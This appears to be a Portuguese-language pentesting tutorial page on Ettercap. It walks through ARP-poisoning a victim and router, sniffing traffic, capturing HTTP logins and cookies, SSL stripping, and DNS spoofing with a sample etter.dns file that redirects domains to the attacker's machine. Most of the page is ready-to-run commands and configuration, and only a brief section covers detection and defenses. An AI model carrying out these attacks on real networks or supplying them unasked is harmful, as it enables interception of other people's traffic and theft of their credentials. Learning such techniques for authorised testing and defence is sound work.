# Ettercap — MITM Attack Framework

## Introdução

**Ettercap** é ferramenta para executar ataques man-in-the-middle (MITM).

---

## Instalação

```bash
sudo apt install ettercap-common ettercap-graphical

# Verificar
ettercap --version
```

---

## Conceitos

### ARP Spoofing
Falsificar endereço MAC para interceptar tráfego.

```
┌─────────────┐
│   Vítima    │ IP: 192.168.1.50
└──────┬──────┘
       │
       ├─ "Você é router!" (MAC falso)
       │
┌──────▼──────┐
│  Atacante   │ IP: 192.168.1.100
└──────┬──────┘
       │
       └─ "Você é vítima!" (MAC falso)
       │
┌──────▼──────┐
│    Router   │ IP: 192.168.1.1
└─────────────┘
```

### Resultados
- Tráfego flui através do atacante
- Pode interceptar e modificar pacotes
- Detector de passwords
- SSL downgrade

---

## Uso Básico (GUI)

### 1. Iniciar

```bash
sudo ettercap -G
```

### 2. Configurar Interface

```
Sniffing → Select a Network Interface
Escolher: eth0 (ou interface ativa)
```

### 3. Scan de Hosts

```
Hosts → Scan for hosts

Resultado:
192.168.1.1 (Router)
192.168.1.50 (Vítima)
192.168.1.100 (Você)
```

### 4. Adicionar Targets

```
Hosts → Host List

Selecionar:
Target 1: 192.168.1.50 (vítima)
Target 2: 192.168.1.1 (router)
```

### 5. Iniciar MITM

```
MITM → ARP Poisoning ✓
```

### 6. Sniffing

```
Sniffing → Start sniffing
```

Agora todo tráfego será capturado.

---

## Uso Avançado (CLI)

### Scan de Hosts

```bash
sudo ettercap -T -Q -i eth0 -p / -s
```

Flags:
- `-T`: Text mode
- `-Q`: Quiet mode
- `-i eth0`: Interface
- `-p /`: Passive mode
- `-s`: Script

### MITM + Sniffing

```bash
sudo ettercap -T -M arp /192.168.1.50/ /192.168.1.1/
```

Flags:
- `-M arp`: ARP spoofing
- `/IP1/`: Target 1
- `/IP2/`: Target 2

---

## Captura de Passwords

### HTTP (Não criptografado)

Ettercap pode capturar:
- Credenciais HTTP
- Cookies
- Dados de formulário

**Resultado**:
```
[*] HTTP Data (POST)
HOST: example.com
USER: admin
PASS: password123
```

### HTTPS (Criptografado)

```
[!] Connection encrypted (SSL)
[*] Trying to perform SSL stripping...
```

Ettercap tenta downgrade para HTTP.

---

## SSL Stripping

### Conceito

Converter HTTPS para HTTP:

```
Vítima ← (insecuro) → Atacante
                        ↓
                      HTTPS
                        ↓
                      Servidor
```

### Ativação

```
MITM → Start sniffing (com SSL stripping)
```

---

## Plugins

### Listar Plugins

```
Plugins → Manage the Plugins
```

### Plugins Úteis

```
dns_spoof       - DNS spoofing
sslstrip        - SSL stripping
hunt_dns        - DNS detector
```

### Usar Plugin

```
Plugins → Manage the Plugins
Selecionar: dns_spoof
Load
```

---

## DNS Spoofing

### Configurar

```
Plugins → Manage the Plugins
dns_spoof → Load

Editar: /etc/ettercap/etter.dns
```

### Arquivo de Config

```
# /etc/ettercap/etter.dns
example.com A 192.168.1.100
www.example.com A 192.168.1.100
mail.example.com A 192.168.1.100
```

### Resultado

Vítima acessa www.example.com → Vai para 192.168.1.100 (seu servidor)

---

## Defesa

### Detecção

```bash
# Procurar por ARP duplicado
arp -a | grep -i duplicate

# Monitorar ARP
arpwatch

# Verificar cache ARP
arp -a
```

### Proteção

```
✅ Usar HTTPS sempre
✅ Verificar certificado
✅ Usar VPN
✅ Implementar DHCP snooping
✅ Dynamic ARP Inspection (DAI)
✅ Port security
✅ HSTS headers
```

---

## Checklist MITM

```
☐ Interface configurada
☐ Hosts escaneados
☐ Targets selecionados
☐ ARP spoofing ativo
☐ Sniffing iniciado
☐ Dados capturados
☐ Análise realizada
☐ Tráfego re-enviado
```

---

Próximo: `privilege-escalation.md`
